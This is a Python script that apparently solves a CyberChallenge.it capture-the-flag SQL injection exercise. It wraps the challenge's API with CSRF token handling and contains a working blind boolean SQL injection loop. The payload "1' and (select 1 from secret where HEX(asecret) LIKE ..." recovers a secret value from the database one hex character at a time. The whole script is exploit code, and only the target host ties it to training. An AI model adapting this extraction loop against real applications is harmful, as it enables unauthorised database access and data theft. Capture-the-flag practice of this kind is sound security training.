import requests
import binascii
import time


class Inj:
    def __init__(self, host):
        self.sess = requests.Session()  # Start the session. We want to save the cookies
        self.base_url = '{}/api/'.format(host)
        self._refresh_csrf_token()  # Refresh the ANTI-CSRF token

    def _refresh_csrf_token(self):
        resp = self.sess.get(self.base_url + 'get_token')
        resp = resp.json()
        self.token = resp['token']

    def _do_raw_req(self, url, query):
        headers = {'X-CSRFToken': self.token}
        data = {'query': query}
        return self.sess.post(url, json=data, headers=headers).json()

    def logic(self, query):
        url = self.base_url + 'logic'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def union(self, query):
        url = self.base_url + 'union'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def blind(self, query):
        url = self.base_url + 'blind'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']

    def time(self, query):
        url = self.base_url + 'time'
        response = self._do_raw_req(url, query)
        return response['result'], response['sql_error']


payload = "1' and (select 1 from secret where HEX(asecret) LIKE '{}%')='1"
inj = Inj('http://sqlinjection.challs.cyberchallenge.it')

dictionary = '0123456789abcdef'
result = '434349547b'
while True:
    for c in dictionary:
        question = f"1' and (select 1 from secret where HEX(asecret) LIKE '{result+c}%')='1"
        response, error = inj.blind(question)
        if response == 'Success': # We have a match!
            result += c
            print(c, end='')
            break
    else:
        break
#converting hex to ascii
print(binascii.unhexlify(result).decode())
